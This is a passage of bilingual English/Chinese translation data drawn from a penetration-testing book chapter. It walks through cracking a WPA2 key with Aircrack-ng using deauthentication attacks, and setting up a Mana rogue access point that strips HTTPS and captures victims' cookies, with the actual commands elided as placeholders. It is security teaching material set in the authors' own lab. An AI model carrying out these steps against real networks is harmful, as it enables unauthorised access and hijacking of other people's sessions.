- en: Chapter 6. Exploring Hacking Toolkits
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第六章：探索黑客工具包
- en: As you probably know, hackers and penetration testers use not only small standalone
    utilities in their work, but also (probably more often) various sets of security
    tools and whole OS distributions built for penetration testing and filled with
    necessary tools.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你可能知道的那样，黑客和渗透测试人员在工作中不仅使用小型独立的工具，还经常使用（可能更常见的是）各种安全工具集和专为渗透测试构建的操作系统发行版，其中包含了所需的工具。
- en: In the course of this chapter, we are going to review toolkits, frameworks,
    and distributions and provide examples of their utilization in our lab environment
    in order to familiarize you with them and help you choose the toolkits you would
    like to learn in more depth for your tasks.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将回顾工具包、框架和发行版，并提供它们在我们实验室环境中的应用示例，以帮助你熟悉这些工具，并帮助你选择希望深入学习的工具包，以应对你的任务。
- en: 'In this chapter, we are going to cover the following topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将涵盖以下主题：
- en: Wireless hacking tools
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 无线黑客工具
- en: Infrastructure hacking tools
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 基础设施黑客工具
- en: Cracking tools
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 破解工具
- en: Web application hacking tools
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Web应用程序黑客工具
- en: Wireless hacking tools
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 无线黑客工具
- en: Logically following our assertion that our book is about creating a lab for
    wireless networks, we are going to start reviewing penetration testing frameworks
    and toolkits with a topic dedicated to wireless hacking.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 根据我们书中关于构建无线网络实验室的论述，我们将开始回顾渗透测试框架和工具包，首先讨论一个专门关于无线黑客的主题。
- en: Aircrack-ng
  id: totrans-10
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Aircrack-ng
- en: When we talk about an approach and tools for Wi-Fi hacking, the first thing
    that comes in our minds is Aircrack-ng ([http://www.aircrack-ng.org](http://www.aircrack-ng.org)).
    Although there is a standalone tool for cracking WEP, WPA, and WPA2 security with
    the same name, the whole set of tools is called Aircrack-ng and the cracking tool
    is included in this set among the others.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们谈论Wi-Fi黑客的方式和工具时，首先浮现在我们脑海中的就是Aircrack-ng（[http://www.aircrack-ng.org](http://www.aircrack-ng.org)）。尽管有一个独立的工具用于破解WEP、WPA和WPA2安全，但整个工具集被称为Aircrack-ng，而破解工具只是其中之一。
- en: We will not exaggerate by saying that Aircrack-ng is our favorite and the must-use
    toolkit in Wi-Fi penetration testing projects, though we do not always use all
    of the tools included in it.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不会夸大其词地说，Aircrack-ng是我们最喜欢的，也是Wi-Fi渗透测试项目中必用的工具包，尽管我们并不总是使用其中包含的所有工具。
- en: The toolkit is primarily developed for Linux and command line usage and despite
    the fact that it can also be used under Windows, we would recommend to use it
    only under `*nix`-like systems because there are a lot of limitations under Windows.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 该工具包主要为Linux和命令行使用开发，尽管它也可以在Windows下使用，我们建议只在`*nix`类系统下使用，因为在Windows下有很多限制。
- en: 'There are three ways of using Aircrack-ng:'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 使用Aircrack-ng有三种方式：
- en: 'Installing Aircrack-ng on your Linux host from source code or with a package
    manager, for example, on a Debian-like system (it is already preinstalled in penetration
    testing distributions like Kali Linux):'
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从源代码或包管理器在Linux主机上安装Aircrack-ng，例如，在类似Debian的系统中（它已经预安装在像Kali Linux这样的渗透测试发行版中）：
- en: '[PRE0]'
  id: totrans-16
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Booting from a live CD with Aircrack-ng installed
  id: totrans-17
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从安装了Aircrack-ng的Live CD启动
- en: Downloading a VMware VM image with Aircrack-ng installed
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 下载一个已安装Aircrack-ng的VMware虚拟机镜像
- en: Content
  id: totrans-19
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 内容
- en: 'The following list shows you the tools of this the framework and provides you
    with a short description of each:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 以下列表展示了该框架的工具，并为你提供每个工具的简短描述：
- en: '**Airbase-ng**: This tool is used to create software APs and attack wireless
    clients.'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airbase-ng**：此工具用于创建软件AP并攻击无线客户端。'
- en: '**Aircrack-ng**: This is actually the cracking tool for WEP and WPA/WPA2 key
    recovery.'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Aircrack-ng**：这实际上是用于WEP和WPA/WPA2密钥恢复的破解工具。'
- en: '**Airdecap-ng**: This is used for decrypting WEP and WPA/WPA2 wireless traffic.'
  id: totrans-23
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airdecap-ng**：此工具用于解密WEP和WPA/WPA2的无线流量。'
- en: '**Airdecloak-ng**: This tool is used for beating WEP cloaking, a method used
    in WEP to fool cracking tools.'
  id: totrans-24
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airdecloak-ng**：此工具用于破解WEP隐身功能，这是WEP中用于欺骗破解工具的一种方法。'
- en: '**Aireplay-ng**: This generates supplementary wireless traffic to allow performing
    various attack types.'
  id: totrans-25
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Aireplay-ng**：此工具生成附加的无线流量，以便执行各种攻击类型。'
- en: '**Airmon-ng**: This switches a wireless interface into monitor mode, which
    allows low-level wireless traffic manipulations.'
  id: totrans-26
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airmon-ng**：此工具将无线接口切换到监视模式，从而允许低级别的无线流量操作。'
- en: '**Airodump-ng**: This tool is used for 802.11 monitoring and sniffing.'
  id: totrans-27
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airodump-ng**：此工具用于802.11监控和嗅探。'
- en: '**Airodump-ng-oui-update**: As suggested by the name, this tool is used to
    update the **Organizationally Unique Identifier** (**OUI**) database of Airodump-ng.'
  id: totrans-28
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airodump-ng-oui-update**：顾名思义，该工具用于更新Airodump-ng的**组织唯一标识符** (**OUI**) 数据库。'
- en: '**Airolib-ng**: This tool is useful for maintaining a local database of ESSIDs,
    passphrases and precomputed PMKs to use in cracking (the idea is very similar
    to using rainbow tables).'
  id: totrans-29
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airolib-ng**：该工具用于维护一个本地的ESSID、密码短语和预计算的PMK数据库，以便在破解时使用（这个思路与使用彩虹表类似）。'
- en: '**Airserv-ng**: This allows multiple applications to access the Wi-Fi interface
    via TCP connections as a server.'
  id: totrans-30
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airserv-ng**：该工具允许多个应用通过TCP连接作为服务器访问Wi-Fi接口。'
- en: '**Airtun-ng**: This is the tool for creating virtual tunnel interfaces.'
  id: totrans-31
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Airtun-ng**：这是用于创建虚拟隧道接口的工具。'
- en: '**Besside-ng**: This is the automated WEP and WPA attacking tool to crack all
    reachable WEP-protected networks and record all available WPA-handshakes.'
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Besside-ng**：这是一个自动化的WEP和WPA攻击工具，用于破解所有可接入的WEP保护网络，并记录所有可用的WPA握手。'
- en: '**Easside-ng**: This tool allows us to communicate via an WEP-protected AP
    without a WEP-key.'
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Easside-ng**：该工具允许我们在没有WEP密钥的情况下，通过WEP保护的AP进行通信。'
- en: '**Packetforge-ng**: As its name suggests, this tool is used to create forged
    wireless packets used in other attacks.'
  id: totrans-34
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Packetforge-ng**：顾名思义，该工具用于创建伪造的无线数据包，以用于其他攻击。'
- en: '**Tkiptun-ng**: As per the official documentation, this tool is very useful:'
  id: totrans-35
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Tkiptun-ng**：根据官方文档，该工具非常有用：'
- en: This tool is able to inject a few frames into a WPA TKIP network with QoS.
  id: totrans-36
  prefs:
  - PREF_IND
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 该工具能够向WPA TKIP网络中注入一些带有QoS的帧。
- en: But the authors of this book have not used it yet and are not sure if this tool
    is released or is still under development.
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 但本书的作者尚未使用过该工具，且不确定它是否已发布或仍在开发中。
- en: '**Wesside-ng**: This is the automated WEP-attacking tool for cracking all reachable
    WEP-protected networks without user interaction.'
  id: totrans-38
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Wesside-ng**：这是一个自动化的WEP攻击工具，用于破解所有可接入的WEP保护网络，无需用户交互。'
- en: Note
  id: totrans-39
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: For a detailed description of the tools and their documentation, refer to the
    official Aircrack-ng website ([http://www.aircrack-ng.org/](http://www.aircrack-ng.org/)).
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 关于这些工具及其文档的详细描述，请参阅官方的Aircrack-ng网站 ([http://www.aircrack-ng.org/](http://www.aircrack-ng.org/))。
- en: Exercise
  id: totrans-41
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 练习
- en: 'Let''s complete a short exercise with Aircrack-ng utilization under Linux.
    As an example, we will crack a WPA2 key:'
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们在Linux下使用Aircrack-ng进行一个简单的练习。作为示例，我们将破解一个WPA2密钥：
- en: 'As the very first step in a Wi-Fi penetration test, we need to switch our Wi-Fi-interface
    into a promiscuous monitor mode to allow the system to "hear" all the Wi-Fi packets
    and allow it to inject wireless traffic working on a low-level interface level.
    Assuming that our wireless interface is `wlan1`, it can be done with the `airmon-ng`
    utility as follows:'
  id: totrans-43
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 作为Wi-Fi渗透测试的第一步，我们需要将Wi-Fi接口切换到混杂监控模式，以便让系统“监听”所有Wi-Fi数据包，并允许它在低级接口上注入无线流量。假设我们的无线接口是`wlan1`，可以通过`airmon-ng`工具如下操作：
- en: '[PRE1]'
  id: totrans-44
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'After that, we can see the report that the interface is turned into the monitor
    mode:'
  id: totrans-45
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 然后，我们可以看到接口已切换到监控模式的报告：
- en: '![Exercise](../images/00050.jpeg)'
  id: totrans-46
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![练习](../images/00050.jpeg)'
- en: 'The preceding command turns the wireless interface into a monitor mode and
    creates a virtual interface `wlan1mon`, which we will use in the next steps. You
    can see that `airmon-ng` warns you about possible conflicts with some processes
    and provides you a list of them. If you want to quickly kill all those processes,
    just execute the following command:'
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 上述命令将无线接口切换到监控模式，并创建一个虚拟接口`wlan1mon`，我们将在接下来的步骤中使用它。你可以看到，`airmon-ng`会警告你某些进程可能会冲突，并提供这些进程的列表。如果你想快速终止所有这些进程，只需执行以下命令：
- en: '[PRE2]'
  id: totrans-48
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Now, let''s listen to the air to find out what do we have around and choose
    a target. It can be done with the `airodump-ng` tool with the monitoring virtual
    interface''s name as a parameter:'
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，让我们监听无线信号，看看周围有什么并选择一个目标。可以使用`airodump-ng`工具，并以监控虚拟接口的名称作为参数来完成：
- en: '[PRE3]'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'Let the tool work for a while (5 minutes should be enough) and you can see
    two tables, updated in a real-time mode. Check out the following screenshot:'
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 让工具运行一段时间（5分钟应该足够），然后你可以看到两个表格，它们会以实时模式更新。请查看下面的截图：
- en: '![Exercise](../images/00051.jpeg)'
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![练习](../images/00051.jpeg)'
- en: You can see both our lab WLANs along with their security types in the first
    table which lists accessible APs. So, let's attack the guest WLAN as we own this
    network and do not need any additional permission to attack.
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在第一个表格中，你可以看到我们的实验室 WLAN 和它们的安全类型，表格列出了可访问的 AP。所以，让我们攻击访客 WLAN，因为我们拥有这个网络，无需额外的权限就可以进行攻击。
- en: We need to obtain a WPA handshake to crack it and a handshake can be sniffed
    by just passively waiting for a device establishing a connection with the AP.
    But to extend our example and show you how the `aireplay-ng` tool works, we are
    going to use an active attack in order to force a device, already connected to
    the WLAN, to disconnect and try to connect again.
  id: totrans-54
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们需要获取一个 WPA 握手来破解它，而握手可以通过被动等待设备与 AP 建立连接时嗅探到。但是，为了扩展我们的示例并向你展示 `aireplay-ng`
    工具的使用方法，我们将使用一种主动攻击，迫使已经连接到 WLAN 的设备断开连接并尝试重新连接。
- en: 'To perform a targeted attack, we need to restart `airodump-ng` with more parameters
    in order to sniff only the communications of our Guest WLAN. The parameters are
    target BSSID, target Wi-Fi channel, and the capture filename. Values for the first
    two parameters come from the first `airodump-ng` capture:'
  id: totrans-55
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要执行定向攻击，我们需要重新启动 `airodump-ng`，并添加更多参数以便只嗅探我们的访客 WLAN 的通信。这些参数包括目标 BSSID、目标
    Wi-Fi 通道和捕获文件名。前两个参数的值来自第一次 `airodump-ng` 捕获的结果：
- en: '[PRE4]'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'In the result, you''ll get a much cleaner output that shows the information
    about only the target WLAN, as shown in the following screenshot:'
  id: totrans-57
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在结果中，你将得到一个更加简洁的输出，显示只有目标 WLAN 的信息，如下图所示：
- en: '![Exercise](../images/00052.jpeg)'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![Exercise](../images/00052.jpeg)'
- en: 'When `airodump-ng` is not jumping from channel to channel, it can better detect
    associated clients. We need to choose a device associated with the AP and perform
    a deauthentication attack on it using `aireplay-ng` on behalf of the AP (forgery).
    Let''s attack a client with the hardware address `C8:F7:33:0E:73:38` from the
    preceding screenshot. Open a new terminal window and execute the following command:'
  id: totrans-59
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当 `airodump-ng` 不在不同的频道之间跳转时，它能更好地检测已连接的客户端。我们需要选择一个与 AP 关联的设备，并使用 `aireplay-ng`
    以 AP 身份（伪造）对其执行去身份认证攻击。让我们攻击上一截图中硬件地址为 `C8:F7:33:0E:73:38` 的客户端。打开一个新的终端窗口并执行以下命令：
- en: '[PRE5]'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'In the following screenshot, you can see `aireplay-ng` performing the attack
    and `airodump-ng` capturing a WPA-handshake from a client, that is trying to re-authenticate:'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 在以下截图中，你可以看到 `aireplay-ng` 正在执行攻击，而 `airodump-ng` 捕获到一个正在尝试重新认证的客户端的 WPA 握手：
- en: '![Exercise](../images/00053.jpeg)'
  id: totrans-62
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![Exercise](../images/00053.jpeg)'
- en: 'Alternatively, you can do it less gently and perform a broadcast deauthentication
    attack to all associated clients with the command:'
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 或者，你也可以不那么温和地执行广播去身份认证攻击，对所有已连接的客户端进行攻击，命令如下：
- en: '[PRE6]'
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE6]'
- en: If the device is configured to automatically reconnect to the WLAN, we will
    be able to capture the next WPA-handshake and see the corresponding message in
    the top right corner of the `airodump-ng` terminal.
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果设备配置为自动重新连接到 WLAN，我们将能够捕获下一个 WPA 握手，并在 `airodump-ng` 终端的右上角看到相应的消息。
- en: Now let's create a short wordlist and add our guest WLAN PSK there.
  id: totrans-66
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在让我们创建一个简短的字典文件，并将我们的访客 WLAN PSK 添加到其中。
- en: 'After that, just start the `aircrack-ng` tool with the dump file and the wordlist
    as parameters:'
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 之后，只需启动 `aircrack-ng` 工具，并将转储文件和字典文件作为参数：
- en: '[PRE7]'
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Cracking time can vary depending on the size of your wordlist, but if the correct
    PSK is in the wordlist, it will be found and displayed to you as shown on the
    following screenshot:'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 破解时间可能会根据字典文件的大小而有所不同，但如果正确的 PSK 在字典中，它会被找到并显示给你，如下图所示：
- en: '![Exercise](../images/00054.jpeg)'
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![Exercise](../images/00054.jpeg)'
- en: At this point, you can connect to the WLAN using the recovered PSK and the WLAN's
    security is bypassed.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 到这时，你可以使用恢复的 PSK 连接到 WLAN，从而绕过 WLAN 的安全设置。
- en: Mana
  id: totrans-72
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Mana
- en: Mana is another interesting Wi-Fi penetration testing toolkit mainly aimed towards
    attacking wireless clients rather than wireless networks. It can perform man-in-the-middle
    attacks with a rogue access point and harvest credentials with fake Internet.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: Mana 是另一个有趣的 Wi-Fi 渗透测试工具包，主要用于攻击无线客户端，而非无线网络。它可以通过恶意接入点执行中间人攻击，并通过虚假的互联网收集凭据。
- en: 'Mana is a Linux toolkit based on a modified version of Hostapd software (used
    to create software access points) and contains the following start scripts for
    launching Mana in various attacks modes (the description is taken from the original
    readme file):'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: Mana 是一个基于修改版 Hostapd 软件的 Linux 工具包（用于创建软件访问点），并包含以下启动脚本，用于在各种攻击模式下启动 Mana（描述来自原始的
    README 文件）：
- en: '`start-nat-full.sh`: This will fire up MANA in NAT mode (you''ll need an upstream
    link) with all the MitM bells and whistles.'
  id: totrans-75
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`start-nat-full.sh`：这将启动 MANA，使用 NAT 模式（你需要一个上游连接），并包含所有的中间人攻击（MitM）功能。'
- en: '`start-nat-simple.sh`: This will fire up MANA in NAT mode, but without any
    of `firelamb`, `sslstrip`, `sslsplit`, and so on.'
  id: totrans-76
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`start-nat-simple.sh`：这将启动 MANA，在 NAT 模式下运行，但不包含任何 `firelamb`、`sslstrip`、`sslsplit`
    等工具。'
- en: '`start-noupstream.sh`: This will start MANA in a "fake Internet" mode. This
    is useful for places where people leave their Wi-Fi on, but there is no upstream
    Internet. Also contains the captive portal.'
  id: totrans-77
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`start-noupstream.sh`：这将启动 MANA，在“假互联网”模式下运行。这对于那些人们打开了 Wi-Fi 但没有上游互联网的地方很有用。还包含了强制门户。'
- en: '`start-noupstream-eap.sh`: This will start MANA with the EAP attack and `noupstream`
    mode.'
  id: totrans-78
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`start-noupstream-eap.sh`：这将启动 MANA，使用 EAP 攻击和 `noupstream` 模式。'
- en: 'The Mana toolkit can be downloaded and installed in three ways:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: Mana 工具包可以通过三种方式下载并安装：
- en: From the Git repository [https://github.com/sensepost/mana](https://github.com/sensepost/mana)
    (`git clone + make install`)
  id: totrans-80
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 从 Git 仓库 [https://github.com/sensepost/mana](https://github.com/sensepost/mana)
    下载（`git clone + make install`）
- en: By starting one of the scripts `ubuntu-install.sh` or `kali-install.sh` from
    Mana archive
  id: totrans-81
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过从 Mana 存档中启动 `ubuntu-install.sh` 或 `kali-install.sh` 脚本
- en: 'Using `apt-get`: `apt-get install mana-toolkit`'
  id: totrans-82
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用 `apt-get`：`apt-get install mana-toolkit`
- en: After installation, the Mana software can be found in `/usr/share/mana-toolkit/`
    and its configuration files can be found in `/etc/mana-toolkit/`.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 安装后，Mana 软件可以在 `/usr/share/mana-toolkit/` 找到，其配置文件可以在 `/etc/mana-toolkit/` 中找到。
- en: Exercise
  id: totrans-84
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 练习
- en: 'Let''s set up an evil AP with Mana toolkit in order to attempt to sniff client
    traffic:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用 Mana 工具包设置一个恶意 AP，尝试嗅探客户端流量：
- en: Install the Mana toolkit on your Linux attacker machine if you have not done
    it yet.
  id: totrans-86
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果你还没有在你的 Linux 攻击者机器上安装 Mana 工具包，请进行安装。
- en: 'Connect a wireless interface to the attacker machine and find out its name
    with the `iwconfig` command:'
  id: totrans-87
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将无线接口连接到攻击者机器，并使用 `iwconfig` 命令查找其名称：
- en: '[PRE8]'
  id: totrans-88
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'From the command output, we can see that (in our case) it is `wlan1`:'
  id: totrans-89
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 从命令输出中，我们可以看到（在我们的例子中）是 `wlan1`：
- en: '[PRE9]'
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE9]'
- en: Now, we need to adjust the script that we are going to utilize and the corresponding
    config files. We are going to use `start-nat-full.sh`. Open the script file in
    editor and change the value of the `phy` parameter to the name of your Wi-Fi interface
    (`wlan1` in our case).
  id: totrans-91
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在，我们需要调整要使用的脚本和相应的配置文件。我们将使用 `start-nat-full.sh`。用编辑器打开脚本文件，并将 `phy` 参数的值更改为你的
    Wi-Fi 接口名称（在我们的例子中是 `wlan1`）。
- en: The corresponding config file name can be found in the beginning of the script
    and it is `/etc/mana-toolkit/hostapd-karma.conf`. You also need to check if the
    values of the parameters `interface` and `driver` correspond to your Wi-Fi interface.
  id: totrans-92
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对应的配置文件名称可以在脚本开始处找到，它是 `/etc/mana-toolkit/hostapd-karma.conf`。你还需要检查参数 `interface`
    和 `driver` 的值是否与你的 Wi-Fi 接口相符。
- en: Now, just run the script and Mana will set up a rogue AP with all the necessary
    tools needed to imitate a Wi-Fi hotspot offering free Internet access and logging
    client traffic.
  id: totrans-93
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在，只需运行脚本，Mana 就会设置一个恶意 AP，并配置所有必要的工具，模拟一个提供免费互联网访问和记录客户端流量的 Wi-Fi 热点。
- en: Check if an EvilAP was successfully created. Open available wireless networks
    and see if **Internet** (or your evil SSID if you have changed it in the config
    file) is among them:![Exercise](../images/00055.jpeg)
  id: totrans-94
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 检查是否成功创建了 EvilAP。打开可用的无线网络，查看是否有 **Internet**（或者如果你在配置文件中更改了 SSID，查看是否有你的恶意
    SSID）：![练习](../images/00055.jpeg)
- en: Connect to the evil WLAN from another host and try to visit various websites.
    You should see the victim's connections data and attack details in the terminal:![Exercise](../images/00056.jpeg)
  id: totrans-95
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 连接到恶意 WLAN 并尝试访问各种网站。你应该能在终端看到受害者的连接数据和攻击详情：![练习](../images/00056.jpeg)
- en: Mana automatically tries to perform man-in-the-middle attacks for SSL and forces
    web connections to work via HTTP instead of HTTPS using the `sslstrip` tool. You
    can find gathered information in `/var/lib/mana-toolkit/`.
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Mana 会自动尝试执行中间人攻击（MitM）以破解 SSL，并使用 `sslstrip` 工具强制通过 HTTP 而非 HTTPS 连接网页。你可以在
    `/var/lib/mana-toolkit/` 中找到收集的信息。
- en: Mana also uses the tool Firelamb to capture victims' cookies. You can see all
    the captured cookies with the `/usr/share/mana-toolkit/run-mana/firelamb-view.sh`
    script. The tool will even open browser sessions with intercepted cookies for
    you:![Exercise](../images/00057.jpeg)
  id: totrans-97
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Mana 还使用了 Firelamb 工具来捕获受害者的 cookies。你可以使用 `/usr/share/mana-toolkit/run-mana/firelamb-view.sh`
    脚本查看所有捕获的 cookies。该工具甚至会为你用拦截到的 cookies 打开浏览器会话：![练习](../images/00057.jpeg)
- en: Infrastructure hacking tools
  id: totrans-98
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 基础设施黑客工具
- en: Infrastructure hacking is such a broad topic including so many subtopics that
    each of them could be distinguished into a separate huge security domain. Therefore,
    there are so many hacking toolsets, frameworks, and software packs for various
    tasks and scenarios that it would need a whole book to describe all of them. Instead
    of that, we are going to just review probably the most popular, free, and well-known
    hacking tool and framework **Metasploit Framework** (also known as **MSF**) maintained
    by the company Rapid7.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 基础设施黑客攻击是一个非常广泛的话题，包括了许多子话题，每个子话题都可以被区分为一个独立的巨大安全领域。因此，针对各种任务和场景，有许多黑客工具集、框架和软件包，要描述它们所有的话，需要一本完整的书。为了简洁起见，我们将只回顾可能最流行、最免费且最著名的黑客工具和框架——**Metasploit
    框架**（也叫 **MSF**），它由公司 Rapid7 维护。
- en: Nmap
  id: totrans-100
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Nmap
- en: Nmap is the most popular network security tool used by hackers and pentesters
    (and our favorite). This is an excellent tool for discovery and enumeration of
    available live hosts, open ports and network services, and much more. It can be
    used for security checks, to determine a service running on the host, to identify
    the OS and applications, and even to determine the type of firewall used on a
    scanned node.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap 是黑客和渗透测试者最常用的网络安全工具（也是我们最喜欢的工具）。这是一个用于发现和枚举可用主机、开放端口和网络服务等的优秀工具。它可用于安全检查，确定主机上运行的服务，识别操作系统和应用程序，甚至识别扫描节点上使用的防火墙类型。
- en: 'The source code and binaries of Nmap are available at the official website
    ([http://nmap.org/download.html](http://nmap.org/download.html)). A Windows version
    is also available. If you are using Linux, you can find Nmap packages in the repositories
    for most distributions. For example, in Debian Linux, you can type the following
    command in the console:'
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap 的源代码和二进制文件可以在官方网站上获取（[http://nmap.org/download.html](http://nmap.org/download.html)）。也有
    Windows 版本。如果你使用的是 Linux，可以在大多数发行版的仓库中找到 Nmap 包。例如，在 Debian Linux 中，你可以在控制台中输入以下命令：
- en: '[PRE10]'
  id: totrans-103
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: After a few seconds, you'll have a ready binary on your system.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 几秒钟后，你的系统上就会有一个可用的二进制文件。
- en: Nmap is a console application, but before we talk about work in the console,
    it should be noted that there is a GUI for Nmap that you can use to input commands
    and run scan tasks. It is Zenmap. Zenmap allows you to select targets, run scan
    tasks, display results, save results, and compare results with others.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: Nmap 是一个控制台应用程序，但在讨论如何在控制台中使用它之前，应该注意 Nmap 有一个 GUI 界面，你可以用它来输入命令并运行扫描任务。这个界面叫做
    Zenmap。Zenmap 允许你选择目标，运行扫描任务，显示结果，保存结果，并与其他人比较结果。
- en: GUI Zenmap is a good way to get acquainted with Nmap, but it is better to know
    how to use Nmap in the console with command line arguments if you're going to
